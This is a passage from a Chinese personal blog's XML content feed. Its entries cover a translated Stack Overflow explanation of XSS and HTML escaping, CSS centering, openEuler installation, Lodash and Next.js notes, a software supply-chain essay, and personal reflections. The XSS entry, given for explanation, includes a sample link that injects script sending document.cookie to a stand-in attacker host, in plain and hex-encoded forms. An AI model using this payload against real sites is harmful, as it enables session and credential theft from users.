+<p>如果变量 <code>$myQueryParameter</code> 包含一个 <code>&lt;SCRIPT&gt;</code> 标签，它将最终执行（<code>&lt;SCRIPT&gt;</code> 中的）代码。<br>为了防止输入作为代码执行，必须恰当的<strong>转义</strong>某些内容。<br>上面的问题可以通过让变量 <code>$myQueryParameter</code> 包含纯文本解决，但不能把纯文本直接放到HTML中并期望它执行。<br>所以让纯文本变成 HTML，这样才能让它在 HTML 页面中显示。将一种语言的字符串转换成另一种语言就可以嵌入了。<br>你可以执行一个函数来把纯文本转义成 HTML，如：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapePlainTextToHTML</span>(<span class="params">plainText</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> plainText.<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;#34;&#x27;</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（answered by <B><a href="https://stackoverflow.com/users/20394/mike-samuel">Mike Samuel</a></B>）</p>
+<hr>
+<p>跨站脚本（XSS）主要是动态网站页面的安全漏洞，攻击者创建一个恶意链接向网站植入可执行的恶意 JavaScript 代码。大多数情况下，这种漏洞在 GET 变量无需过滤或检测内容就能输出或响应时复现。<br>当受害人点击链接，恶意代码能发送受害人的 cookie 到另一台服务器，或者修改受影响的站点，注入表单，窃取用户名和密码，和其他钓鱼诈骗方法。<br>恶意链接例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://VulnerableHost/a.php?variable=&lt;script&gt;document.location=&#x27;http://AttackersHost/cgi-bin/cookie.cgi%3Fdata=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也能编译恶意代码，十六进制如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://VulnerableHost/a.php?variable=%22%3E%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%41%74%74%61%63%6B%65%72%73%48%6F%73%74%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%2E%63%67%69%3F%20%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure>
+<p>（answered by <B><a href="https://stackoverflow.com/users/5445/cms">CMS</a></B>）</p>
+]]></content>
+      <categories>
+        <category>stackoverflow 高赞翻译</category>
+      </categories>
+      <tags>
+        <tag>stackoverflow</tag>
+        <tag>XSS</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>怎样在一个 div 中水平居中另一个 div</title>
+    <url>/blog/20171109-how-to-horizontally-center-a-div-in-another-div/</url>
+    <content><![CDATA[<blockquote>
+<p><strong>译者注：</strong> 居中问题是前端布局常见问题，受关注度较高，这次翻译的两份答案分别获赞 3000+、1000+。还有部分答案获赞量三位数，就不一一翻译了。<br><strong>原文地址：</strong> <a href="https://stackoverflow.com/questions/114543/how-to-horizontally-center-a-div-in-another-div">https://stackoverflow.com/questions/114543/how-to-horizontally-center-a-div-in-another-div</a></p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h1><p>（如果可行的话，）我们怎样在一个 <code>&lt;div&gt;</code> 中水平居中另一个 <code>&lt;div&gt;</code>?</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;outer&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;inner&quot;</span>&gt;</span>Foo foo<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>(Ask by <strong>Mosh Feu</strong>)</p>
+<h1 id="高赞回答："><a href="#高赞回答：" class="headerlink" title="高赞回答："></a>高赞回答：</h1><p>你可以给内部的 <code>&lt;div&gt;</code> 添加下面的 CSS 样式：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#inner</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然，并不是必须设置 <code>width: 50%;</code>，任何小于子 <code>&lt;div&gt;</code> 的宽度都可以。<code>margin: 0 auto;</code> 才是关键。<br>如果你要兼容IE8及以上的浏览器，下面的方式可以更好的替代：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它能使内部元素水平居中，而不需要设置 <code>width</code> 属性。</p>
+<p>(Answered by <strong>bharadhwaj</strong>)</p>
+<hr>
+<p>如果你不想给子 <code>&lt;div&gt;</code> 一个固定的宽，可以使用下面的方式：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#outer</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这使得内部 <code>&lt;div&gt;</code> 成为可以以文本对齐为中心的内联元素。</p>
+<p>(Answered by <strong>Alfred</strong>)</p>
+]]></content>
+      <categories>
+        <category>stackoverflow 高赞翻译</category>
+      </categories>
+      <tags>
+        <tag>stackoverflow</tag>
+        <tag>前端</tag>
+        <tag>FE</tag>
+        <tag>布局</tag>
+        <tag>水平居中</tag>
+        <tag>display</tag>
+        <tag>center</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过 Oracle VM VirtualBox 安装 openEuler 操作系统</title>
+    <url>/blog/20210711-install-the-openeuler-operating-system-with-oracle-vm-virtualbox/</url>
+    <content><![CDATA[<h1 id="虚拟机（Oracle-VM-VirtualBox）"><a href="#虚拟机（Oracle-VM-VirtualBox）" class="headerlink" title="虚拟机（Oracle VM VirtualBox）"></a>虚拟机（Oracle VM VirtualBox）</h1><h2 id="安装-Oracle-VM-VirtualBox"><a href="#安装-Oracle-VM-VirtualBox" class="headerlink" title="安装 Oracle VM VirtualBox"></a>安装 Oracle VM VirtualBox</h2><p>下载地址 <a href="https://www.oracle.com/cn/virtualization/technologies/vm/downloads/virtualbox-downloads.html?source=:ow:o:p:nav:mmddyyVirtualBoxHero_cn&amp;intcmp=:ow:o:p:nav:mmddyyVirtualBoxHero_cn">https://www.oracle.com/cn/virtualization/technologies/vm/downloads/virtualbox-downloads.html?source=:ow:o:p:nav:mmddyyVirtualBoxHero_cn&amp;intcmp=:ow:o:p:nav:mmddyyVirtualBoxHero_cn</a></p>
+<h2 id="下载-openEuler-镜像"><a href="#下载-openEuler-镜像" class="headerlink" title="下载 openEuler 镜像"></a>下载 openEuler 镜像</h2><p>下载地址 <a href="https://openeuler.org/zh/mirror/list/">https://openeuler.org/zh/mirror/list/</a><br>下载 <code>XXXX.dvd.ios</code></p>
+<h2 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h2><ul>
+<li>新建</li>
+<li>填写虚拟电脑名称和系统类型<br>其中，类型选择 <code>Linux</code>，版本选择 <code>Other Linux（32-bit）</code></li>
+<li>内存大小<br>建议 <code>1024</code> MB</li>
+<li>虚拟硬盘<br>选择 <code>现在创建虚拟硬盘(C)</code></li>
+<li>虚拟硬盘文件类型<br>选择 <code>VDI（VirtualBox 磁盘映像）</code></li>
+<li>存储在物理硬盘上<br>选择 <code>动态分配(D)</code></li>
+<li>文件位置和大小<br>选择位置和大小，其中建议大小 <code>20</code>G</li>
+</ul>
+<h2 id="配置（设置）"><a href="#配置（设置）" class="headerlink" title="配置（设置）"></a>配置（设置）</h2><ul>
+<li>系统 &gt; 启动顺序<br>将 <code>光驱</code> 调到最前</li>
+<li>存储 &gt; 添加光驱</li>
+<li>注册<br>选择下载的 openEuler 镜像</li>
+<li>虚拟光盘选择<br>选择下载的 openEuler 镜像</li>
+<li>保存配置</li>
+</ul>
+<h2 id="安装界面引导"><a href="#安装界面引导" class="headerlink" title="安装界面引导"></a>安装界面引导</h2><ul>
+<li>启动</li>
+<li>选择 <code>Test this media &amp; install openEuler 20.03 LTS</code></li>
+</ul>
+<h2 id="安装界面"><a href="#安装界面" class="headerlink" title="安装界面"></a>安装界面</h2><ul>
+<li>选择安装位置</li>
+<li>用户设置 &gt; 设置 Root 密码</li>
+<li>安装完成</li>
+<li>关机</li>
+</ul>
+<h2 id="重置启动项"><a href="#重置启动项" class="headerlink" title="重置启动项"></a>重置启动项</h2><ul>
+<li>设置 &gt; 存储<br>删除前面选择的光驱</li>
+<li>系统 &gt; 启动顺序<br>重置 <code>启动顺序</code>，删除 <code>光驱</code> 和 <code>软驱</code></li>
+</ul>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>安装完成</p>
+<blockquote>
+<p><strong>参考资料：</strong></p>
+<ul>
+<li><a href="https://docs.openeuler.org/zh/docs/20.03_LTS/docs/Installation/%E5%AE%89%E8%A3%85%E6%8C%87%E5%AF%BC.html">安装指导</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>初学者的 openEuler 之旅</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>openEuler</tag>
+        <tag>VirtualBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Lodash 按需引入</title>
+    <url>/blog/20220316-lodash-is-introduced-on-demand/</url>
+    <content><![CDATA[<p>Lodash 是一个著名 JavaScript 库，为了减少包体积，往往需要按需引入。</p>
+<span id="more"></span>
+
+<p>Lodash 已经将每个函数单独打包，所以只需要单独安装每个函数包。<br>可以参见 <a href="https://www.npmjs.com/~jdalton">https://www.npmjs.com/~jdalton</a> 。</p>
+<p>注意：如果是 TypeScript，需要单独安装类型包。</p>
+<p>以 <code>_.chunk(array, [size=1])</code> 为例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i --save lodash.chunk</span><br></pre></td></tr></table></figure>
+
+<p>如果需要 TypeScript 支持：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save @types/lodash.chunk</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>JavaScript 库</category>
+      </categories>
+      <tags>
+        <tag>JavaScript 库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>杂忆</title>
+    <url>/blog/20170530-remembering-some-stories-with-tomato-in-mid-autumn-festival/</url>
+    <content><![CDATA[<blockquote>
+<p>简书上的一篇旧文，算是一个大学回忆吧。那年，那人，那事，真好。</p>
+</blockquote>
+<span id="more"></span>
+
+<blockquote>
+<p>文中的“你”（@<a href="http://www.jianshu.com/u/ce929757f0b4">张承宇Tomato</a>），校友，独自踏过万水千山，大学四年游遍大半个中国。聊过“江湖故事”，写过“榻上情诗”。</p>
+</blockquote>
+<h1 id="久仰大名"><a href="#久仰大名" class="headerlink" title="久仰大名"></a>久仰大名</h1><p>认识你应该说“命中注定”吧。<br>第一次听说你的大名是由于学校的图书馆要办一个“真人图书馆”的活动，那时图书馆老师每半个月带大家做一次“图书交流会”，我经常去，而“真人图书馆”活动从“图书交流会”刚开始就准备召开，但种种原因一直没有召开过。所以有了你，“天时地利人和”，认识你是我“命中注定”。</p>
+<p>但是见面并不是一帆风顺。<br>“真人图书馆”召开的时间在“运动会”前夕，这样的安排使我佷难从武协运动会开幕式节目排练以及其他事情中脱身，“真人图书馆”活动就这样错过了。</p>
+<p>突然有一天，你在图书馆的群里背负着禁言的代价放了一张微信群的二维码，说让有兴趣的朋友进去看浏览西藏的直播。群的名字是“彳亍”，和你的公众号的名字一样。还是因为忙，直播没有看，偶尔“水”一“水”群。</p>
+<p>去年端午，你在图书馆的QQ群问有没有人一起散步的，三天假打了三天前端代码的我回了你，于是有了第一次也是目前为止倒数第二次“见面”。</p>
+<h1 id="聊了一圈"><a href="#聊了一圈" class="headerlink" title="聊了一圈"></a>聊了一圈</h1><p>我们在约好的地方“见面”，你比我想象中的要结实很多，梳一个辫子，和一般的东北汉子的体型一样，比我这个南方人高也比我胖。说是“见面”，也许是你呼吸道受不了的原因，却带着一张黑色的口罩，加之朦胧的月色，这次只让你“面试”我了。</p>
+<p>那天出寝室的时候已是21：00了，于是我们围绕足球场走了一圈。</p>
+<p>一路上我对你的经历十分好奇，希望多听听你的介绍，以弥补“真人图书馆”活动没有成行的遗憾。你也并没有使我遗憾，一路介绍了自己游行中国的经历，这使我为你的经历，为你的付出感到深深的震撼！</p>
+<blockquote>
+<p>千里之行，始于足下。</p>
+</blockquote>
+<p>你说游行改变了你，使你理解父母，学会了很多书本上学不到的东西，总之使一个“财大气粗”的东北汉子，有了几分“秀气”。</p>
+<p>听完你的介绍，我也曾想在哪个风景宜人的景区附近开一家“青旅”，听来来往往的“背包客”吹牛、扯淡、讲心底的秘密。</p>
+<p>人最难留住的莫过于时间。一圈下来，你说要更新公众号，急着回去排版，推送。就这样各自回寝了。</p>
+<h1 id="后面的事"><a href="#后面的事" class="headerlink" title="后面的事"></a>后面的事</h1><p>1.某次在食堂见到一个男子，感觉像你，相互问了个好，应该是你，这是我目前见你的最后一面，希望有缘再见。</p>
+<p>2.微信群好久不活跃了，公众号也好久没有更新，你在干吗呢。</p>
+<p>3.不久前，“彳亍”推送了一条微信公众号文案，说你辞了杭州的工作，去了吐鲁番，开了一家客栈，得了阑尾炎。现在也许是你最困难的时候，祝福你，有缘再见。</p>
+<h1 id="独行"><a href="#独行" class="headerlink" title="独行"></a>独行</h1><p>这几天身体不太舒服，在寝室窝了好几天，想到今天又是端午，于是独自一人拖着疲惫的身心按去年的路线，走了一遭，一路上心絮纷飞，回寝写了这段文字。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>端午</tag>
+        <tag>回忆</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Next.js 入门笔记 | 创建 Next.js 项目</title>
+    <url>/blog/20210824-next-js-started/</url>
+    <content><![CDATA[<blockquote>
+<p>最近基于 Next.js 写了几个项目，记录一下该框架的使用方法。<br>Next.js 是一个基于 React 的服务端渲染框架，支持 TypeScript。</p>
+</blockquote>
+<span id="more"></span>
+
+<p>创建 Next.js 项目有两种方式——使用 <code>create-next-app</code> 工具创建项目，手动安装。如果是新建项目，推荐使用 <code>create-next-app</code> 工具创建项目；如果是旧项目引入 Next.js，推荐手动安装。</p>
+<h2 id="使用-create-next-app-工具创建项目"><a href="#使用-create-next-app-工具创建项目" class="headerlink" title="使用 create-next-app 工具创建项目"></a>使用 <code>create-next-app</code> 工具创建项目</h2><p>在创建项目的文件夹执行下面命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx create-next-app</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">yarn create next-app</span><br></pre></td></tr></table></figure>
+
+<p>如果需要创建 TypeScript 项目可执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx create-next-app --typescript</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">yarn create next-app --typescript</span><br></pre></td></tr></table></figure>
+
+<h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><p>在项目中执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install next react react-dom</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">yarn add next react react-dom</span><br></pre></td></tr></table></figure>
+
+<p>如果项目中已安装 <code>React</code> 和 <code>ReactDom</code>，则无需安装。</p>
+<p>配置 <code>package.json</code> 的 <code>scripts</code> 字段：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;next dev&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;next build&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;next start&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;next lint&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://www.nextjs.cn/docs/getting-started">Next.js 快速开始</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Next.js</category>
+      </categories>
+      <tags>
+        <tag>Next.js</tag>
+        <tag>create-next-app</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从物流与供应链看“软件供应链”</title>
+    <url>/blog/20221031-software-supply-chain-from-the-perspective-of-logistics-and-supply-chain/</url>
+    <content><![CDATA[<blockquote>
+<p>此文代表我粗浅的认知和思考，希望从一个“旧”视角，带给大家些许“新”思考。有很多不太严谨或正确的地方，亦希望各位师友批评指正。</p>
+</blockquote>
+<p>“我在留学的时候，坐大巴遇见一个小伙子，我问他：‘你学什么专业的’？他说，供应链”，教授在课堂上平静地讲述了这样一个故事，这是我第一次听说“供应链”。</p>
+<span id="more"></span>
+
+<p>后来，随着手机产量被大家关注，手机厂商把“供应链”这样一个原本隐藏在系统之内，不容易被消费者察觉的东西暴露出来，这个概念也“飞入寻常百姓家”。伴随“供应链”概念普及的，还有人们对它的误解。一般人们对“供应链”的认知只停留在“物流”的层面上，往往忽视“资金流”和“信息流”。一般认为，“供应链”是围绕核心企业，通过对信息流、物流、资金流的控制，将供应商、制造商、仓库、配送中心、渠道商及用户有效组织起来，形成一个集计划、采购、制造、配送、退货等内容的网链结构模式。</p>
+<p>在文章开始的那个故事，也存在一个“故事的供应链”——信息（故事）流向大体可以简化为我的老师到我和我的同学，我到看到文章的各位……随着 npm、pip 等包管理工具以及其可开源共享的包管理方式的流行，让人们切实认识到存在“软件的供应链”。</p>
+<p>关于“软件供应链”的定义有许多不同看法，窃以为，根据“供应链”的基本概念，“软件供应链”应该是“全流程”的。悬镜安全与中国信通院联合制作的《软件供应链安全白皮书（2021）》认为“软件供应链”是“通过设计和开发阶段，将生产完成的软件产品通过软件交付渠道从软件供应链运输给最终用户”。《开源软件供应链安全研究综述》一文的作者认为：“开源软件供应链”是开源软件在开发和运行过程中, 涉及到的所有开源软件的上游社区、源码包、二进制包、第三方组件分发市场、应用软件分发市场, 以及开发者和维护者、社区、基金会等, 按照依赖、组合等形成的供应关系网络。窃以为，“软件供应链”是软件所有依赖（上游）包（软件）和下游产品设计、研发、运营、传播，软件产品设计、研发、运营，软件传播和使用的全流程网络。</p>
+<p>“供应链”和“软件供应链”的主体有大的差异。“供应链”的主体往往是有形物质，其生产和运输过程往往受到时空和其装卸搬运工具的限制；“软件供应链”的主体是计算机软件，其生产和传播过程受到的空间限制比“供应链”弱很多。萧伯纳说过：“你有一个苹果，我有一个苹果，我们彼此交换，每人还是一个苹果；你有一种思想，我有一种思想，我们彼此交换，每人可拥有两种思想。”“供应链”的主体是客观的有形物质不随运输而复制生产；“软件供应链”的主体可以伴随传播而复制。一般情况下，使用“软件供应链”的上游产品的边际成本（单位产品的使用成本）要比使用“供应链”的上游产品的边际成本低得多。这些差异导致管理上有些区别。</p>
+<p>需要指出的是，“供应链管理”侧重管理与产品相关的运营实体，而“软件供应链管理”侧重对产品可能出现的风险进行防控和应对。“供应链”中的上下游企业，往往知悉其上下游企业的生产情况；而在“软件供应链”中的开发者可能并不完全清楚自己的软件被哪些下游软件使用，这种情况在开源软件开发者中更为突出。在这种背景下，作为软件研发者，只能主动管理自己软件中依赖软件所产生的风险，理想情况下也应该积极主动修复自身风险，并公开通知下游软件及时更新版本（“软件供应链管理”无法像“供应链管理”中的产品强制召回，对于下游风险的控制，只能依赖下游软件维护者自己升级版本或更换技术方案来修复风险）。因此，“软件供应链管理”在某种程度上说就是“软件风险管理”。</p>
+<p>和“供应链”的风险一样，“软件供应链”的风险也具有必然性、客观性、偶然性、不确定性、多样性、复杂性、传递性和放大性。一个上游软件的风险可能给一个已经平稳运行几年、十几年的系统带来不确定影响，有些影响如许可证更换甚至不会影响软件的正常运行，需要软件维护者积极关注上游软件动态。关于“软件供应链”风险分类，庄表伟老师的演讲《分类理解“开源供应链风险”》中已经有比较完整的思考可以参考，这里不再赘述。</p>
+<p>对于“软件供应链”的风险管理，和“供应链”的风险管理一样，在风险发生前预防风险，评估风险带来的损失，参考二八定律，制定风险防范方案；在风险发生后积极应对，降低风险带来的损失。除此之外，在管理“软件供应链”时，还应积极构建风险监听系统，主动监听上下游软件风险，以避免损失。</p>
+<p>我的老师在给我们讲述那段邂逅的同时，也想起了她当年在课间随意躺在小山包上晒太阳的美好时光，希望所有的软件都能在阳光下免受侵害，软件维护者能享受业余的每一份暖阳。</p>
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li><a href="https://wiki.mbalib.com/wiki/%E4%BE%9B%E5%BA%94%E9%93%BE%E7%AE%A1%E7%90%86">供应链管理 - MBA智库百科 (mbalib.com)</a></li>
+<li><a href="http://www.jos.org.cn/jos/article/abstract/6717">开源软件供应链安全研究综述 (jos.org.cn)</a></li>
+<li>悬镜安全,中国信通院.软件供应链安全白皮书（2021）[R]</li>
+<li><a href="https://www.bilibili.com/video/BV1xd4y1i7Wb">分类理解“开源供应链风险”</a></li>
+</ul>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>物流</tag>
+        <tag>供应链</tag>
+        <tag>软件供应链</tag>
+        <tag>开源软件供应链</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>莽谈阅读课</title>
+    <url>/blog/20171125-talking-recklessly-about-reading/</url>
+    <content><![CDATA[<blockquote>
+<p>算起来，这是大三上学期末写的一篇随感，没有写完，躺在简书的草稿箱里，现在扒拉出来，有些见地非常浅薄，博君一笑。<br>原拟的标题是《莽谈阅读》，这里改为《莽谈阅读课》。<br>另外，感谢简书替我保管了这些浅薄的思想。</p>
+</blockquote>
+<span id="more"></span>
+
+<blockquote>
+<p>文献检索课结束了，老师提出一个问题，若开一门“阅读”课，你最喜欢听什么内容，最喜欢用什么形式讲解？<br>那我就鲁莽一回，斗胆分析下“阅读”课，我们<strong>应该</strong>学习什么样的内容？什么样的课我们欢迎？（均系个人喜好、个人观点，轻喷，谢谢）</p>
+</blockquote>
+<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>我们不妨先分析下“阅读课”的目的，把握好目的才能有的放矢。<br>“阅读课”<strong>不是</strong>一门<strong>“专业课”</strong>，即他的目的不在于要求我们掌握多少专业知识（如： 歌德所说的：“像他那样的开场是现存最伟大的最好的开场”，是指莫里哀的《伪君子》），而在于<strong>培养我们的阅读兴趣，让我们养成阅读的习惯</strong>。</p>
+<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><h2 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h2><p><strong>1.有趣</strong><br>这应该是内容筛选的“第一原则”，因为只有有趣的内容才能吸引我们。但是“有趣”并非绝对的，这就像一个笑话讲出来，有些人却觉得“好冷”（不好笑），每个人的认知不同，也就决定每个人的兴趣点不同，即使这样我们也应该相信找到这样的内容并不难，因为“笑点奇高”人毕竟是少数。以此，重某种角度说，与其说是“有趣”不如说是“吸引人的”。</p>
+<p><strong>2.全面</strong><br>前面我们谈到，人与人之间的阅读体验是有差异的，这是必然的，每个人的成长经历和环境不同决定了这一点。这是授课内容“全面性”的第一个原因，第二个原因则是每个人的知识架构都具有片面性，并不是每一个方面都了解，万一有某种书感兴趣，却不了解呢。所以，我们希望这门课所涉猎的书籍应该是<strong>多元</strong>的，时间上从古至今，地域上从国内到国外，角度上从微观到宏观，学科上从文史哲到数理化……</p>
+<p><strong>3.非专业</strong><br>前面已提及，就不赘叙了。</p>
+<h2 id="举隅"><a href="#举隅" class="headerlink" title="举隅"></a>举隅</h2><p>在这里只能举一些比较好的具体的题材。</p>
+<p><strong>1.传记</strong><br>不止一个老师推荐阅读名人传记，从中可以了解历史，可以学习为人……</p>
+<p><strong>2.中国古典文学</strong><br>这就不用多说，诗词曲小说传奇散文，每一类都很经典。</p>
+<p><strong>3.古代经典</strong><br>没有读过《四书》就妄谈国学，也不用多说。</p>
+<p><strong>3.现当代文学</strong><br>鲁迅的杂文，朱自清的散文，周作人的小品文，徐志摩的诗……这些都是很经典的消遣。</p>
+<p><strong>4.外国小说</strong><br>福尔摩斯，老大哥这些形象早已深入每一个人心上。</p>
+<h1 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h1><p>（当年不知什么缘故，写到此处便终止了……）</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>阅读</tag>
+        <tag>大学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Next.js 入门笔记 | 页面路由、页面数据获取</title>
+    <url>/blog/20210825-next-js-page/</url>
+    <content><![CDATA[<blockquote>
+<p>最近基于 Next.js 写了几个项目，记录一下该框架的使用方法。<br>Next.js 是一个基于 React 的服务端渲染框架，支持 TypeScript。</p>
+</blockquote>
+<p>本文主要记录 Next.js 的页面路由及页面数据获取。</p>
+<span id="more"></span>
+
+<h2 id="页面路由"><a href="#页面路由" class="headerlink" title="页面路由"></a>页面路由</h2><p>Next.js 的页面路由根据根目录下的 <code>pages</code> 文件夹的文件生成。即一个 page（页面） 就是一个从 <code>.js</code>、<code>.jsx</code>、<code>.ts</code> 或 <code>.tsx</code> 文件默认导出（<code>export default</code>）的 React 组件，每个 page（页面）都使用其文件名作为路由（route）。</p>
+<p>例如：<br>如果你创建了一个命名为 <code>pages/about.js</code> 的文件并导出一个组件，则可以通过 <code>/about</code> 路径进行访问。</p>
+<h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><p>如果你创建了一个命名为 <code>pages/posts/[id].js</code> 的文件，那么就可以通过 <code>posts/1</code>、<code>posts/2</code> 等类似的路径进行访问。</p>
+<p>路由参数获取：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRouter &#125; <span class="keyword">from</span> <span class="string">&#x27;next/router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Post</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> router = <span class="title function_">useRouter</span>()</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = router.<span class="property">query</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Post: &#123;id&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Post</span></span><br></pre></td></tr></table></figure>
+
+<p><code>query</code> 对象除了有 <code>param</code> 的值，还有 <code>query</code> 请求对象的值。<br>以 <code>/pages/post/[id].tsx</code> 为例：</p>
+<table>
+<thead>
+<tr>
+<th>router</th>
+<th>query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/post/1</code></td>
+<td><code>&#123;&quot;id&quot;: &quot;1&quot;&#125;</code></td>
+</tr>
+<tr>
+<td><code>/post/2?name=steven</code></td>
+<td><code>&#123;&quot;id&quot;: &quot;2&quot;, &quot;name&quot;: &quot;steven&quot;&#125;</code></td>
+</tr>
+</tbody></table>
+<p>如果 <code>param</code> 和 <code>query</code> 重名，<code>param</code> 将覆盖 <code>query</code>。<br>以 <code>/pages/post/[id].tsx</code> 为例：</p>
+<table>
+<thead>
+<tr>
+<th>router</th>
+<th>query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/post/3?id=steven</code></td>
+<td><code>&#123;&quot;id&quot;: &quot;3&quot;&#125;</code></td>
+</tr>
+</tbody></table>
+<p>可以有多级动态路由。<br>以 <code>/pages/post/[day]/[name].tsx</code> 为例：</p>
+<table>
+<thead>
+<tr>
+<th>router</th>
+<th>query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/post/2021-01-01/steven</code></td>
